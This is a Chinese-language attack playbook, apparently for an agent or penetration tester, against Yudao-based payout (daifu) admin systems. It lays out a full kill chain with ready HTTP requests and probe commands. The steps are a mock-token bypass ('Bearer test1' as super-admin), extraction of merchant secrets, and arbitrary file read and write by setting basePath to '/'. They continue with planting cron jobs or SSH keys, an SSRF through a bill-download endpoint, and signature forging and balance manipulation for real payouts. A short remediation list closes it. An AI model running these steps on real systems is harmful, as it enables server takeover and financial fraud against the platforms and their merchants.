## 0. 一句话

芋道管理端最短接管不是撞密码，而是 **生产忘关 `mock-enable` → `Bearer test1` 当超管 → 改本地存储 `basePath=/` → 上传写 cron/SSH**。

## 2. 证明分级（禁止跳级）

| 档 | 成立条件 | 不算 |
|----|----------|------|
| L1 | `/admin-api` 芋道信封；或未鉴权 `file/*/get` / `/order/stopQueryOrderJob` 200 | 只看到登录 SPA |
| L2 | `Bearer {secret}{uid}` 读到超管 profile；或登录后 `file/upload` 指定 path 成功 | 只 401 变 200 空 body |
| L2b | `getSecret` 出商户密钥（打码落盘）；或回单接口打到环回/内网特征 | 只看到接口存在 |
| L3 | `basePath=/` 后任意读 **或** 写 `/tmp` marker 再读回（必须恢复 basePath） | 只改了 config 没读回 |
| L4 | cron/SSH / 写马授权内直接做；商户开放 API 真下单（**耗余额先问**） | 平台 `DEALING` 当已出款 |

`Job/create` 只能触发已注册 `JobHandler`，**不是**命令执行。

## 3. 杀伤链

### ① 指纹（L1）

```bash
python3 炼蛊房/yudao_daifu_probe.py recon \
  --base 'https://授权站' --case <案卷> --insecure
```

并行记：`/admin-api/` `/api/admin-api/` `/doc.html` `/v3/api-docs` `/infra/file/18/get/` `/api/order/stopQueryOrderJob`。

### ② Mock Token（L2，默认直接打）

根因：`TokenAuthenticationFilter.mockLoginUser`

- `yudao.security.mock-enable: true`（生产常见忘关）
- 默认 `mock-secret: test`
- 规则：token **以 secret 开头**，后缀 = `userId` → `test`+`1` = **`test1` → 用户 1（超管）**

```http
GET /admin-api/system/user/profile/get HTTP/1.1
Authorization: Bearer test1
tenant-id: 1
```

成功：`username=admin` / `id=1`。  
探针会扫短字典：`test`/`mock`/`admin`/`yudao` × uid `1,2`。

有身份后 **立刻**填 `案卷/object_matrix.md`。

### ③ 本地文件任意读写（框架级，L2→L3）

`getFilePath(path) = basePath + path`（无规范化）。

| 接口 | 权限 | 用法 |
|------|------|------|
| `PUT /infra/file-config/update` | `infra:file-config:update` | 把某条本地存储 `basePath` 改为 `/` |
| `POST /infra/file/upload` | **无 PreAuthorize** | `path=tmp/se_marker` 或 `etc/cron.d/…` |
| `GET /infra/file/{id}/get/**` | **@PermitAll** | `basePath=/` 后未授权读 `/etc/hostname` |

```bash
# 列表 + 默认目录试上传 + 未授权 get（不改根路径）
python3 炼蛊房/yudao_daifu_probe.py file \
  --base 'https://授权站' --case <案卷> --token test1 --insecure

# 授权内 L3：改 basePath=/ → 写/读 /tmp marker → 恢复
python3 炼蛊房/yudao_daifu_probe.py rce-marker \
  --base 'https://授权站' --case <案卷> --token test1 --insecure
```

写 `authorized_keys` / cron 只在用户明确要主机接管时做；做完必须把 `basePath` 改回原值。

### ④ 代付族未鉴权运维（L1/L2）

```http
GET /api/order/stopQueryOrderJob?start=true
GET /api/order/autoNotifyDaifu
GET /api/order/checkOrder
```

`@PermitAll` → 可停查单 / 通知风暴。默认只证明 200，不循环打。

### ⑤ 商户密钥 + 开放 API（L2b，真下单先问）

```http
GET /admin-api/system/df-user/getSecret?id=3
Authorization: Bearer test1
tenant-id: 1
```

签名（`NewSignUtil`）：

```text
sorted(k=v)&...&key=<appSecret>  →  MD5  →  UPPER
memberid = 1000 + df_user.id
```

还要改 `apiIps` 白名单才放行。`changeMoney` / `openerStatus` / 真 `daifu` 下单 = **耗余额，先问**。  
`DEALING` ≠ 上游已扣款；必须查单 + 上游余额交叉。

```bash
python3 炼蛊房/yudao_daifu_probe.py sign \
  --params '{"memberid":"1003","orderid":"t1"}' --secret '<打码>'
```

### ⑥ 回单 AES-SSRF（同族）

`DfOrderController.downloadBillFile*`：`@PermitAll`，AES/ECB/PKCS7，解密后：

- `http*` → 服务端 GET（SSRF）
- 否则 → 本地文件流

家族默认 key 候选见探针 `FAMILY_AES_KEYS`；不中就从 JAR/yml 抽。验证用环回业务口，看是否吃到内网 `401 账号未登录` 一类特征。

## 4. 资金破坏面（铁律）

| 操作 | 风险 | 本库默认 |
|------|------|----------|
| `changeMoney` | 清空/抬高商户余额 | **先问** |
| `openerStatus=SUCCESS` | 伪造成功，非真出款 | 先问；常要谷歌码（库内明文可算） |
| `fail` → HANDFAIL | 退款解锁 | 用户说「等真实处理」时禁止 |
| 商户 API 真下单 | 占资/上游出款 | **先问** |
| 假 DEALING | 锁余额不结算 | 只记口径，不当结案 |

## 6. 修复对照（给授权方）

1. 生产关闭 `yudao.security.mock-enable`  
2. `LocalFileClient`：禁止 `basePath=/`；path 规范化 + 拒 `..`  
3. upload 加权限；`get/**` 取消 PermitAll  
4. 鉴权 `/order/stopQueryOrderJob` 等运维口  
5. 回单接口取消公开 + 密钥外置 + 禁内网 SSRF  
6. BCrypt cost≥10；谷歌密钥加密；`getSecret` 提权 + 审计
